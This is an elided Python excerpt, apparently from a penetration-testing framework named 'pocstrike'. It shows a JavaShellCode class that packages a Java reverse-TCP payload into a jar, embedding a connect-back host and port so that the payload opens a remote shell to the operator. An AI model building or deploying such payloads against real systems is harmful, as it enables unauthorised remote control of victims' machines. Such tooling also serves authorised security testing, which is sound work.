...
from libs.pocstrike.lib.helper.archieve.jar import Jar
from libs.pocstrike.lib.core.common import read_binary
from libs.pocstrike.lib.core.enums import SHELLCODE_TYPE
...
class JavaShellCode(ShellCode):
    ...
    def get_jar(self, filename=""):
        filepath = os.path.join(paths.POCSTRIKE_TMP_PATH, "payload.jar")
        jar = Jar(filepath)
        data = "{host};{port}".format(host=self.connect_back_ip, port=self.connect_back_port)
        jar.add_file('east/data.dat', data)
        path = os.path.join(paths.POCSTRIKE_ROOT_PATH, 'shellcodes/data/java/reverse_tcp/Payload.class')
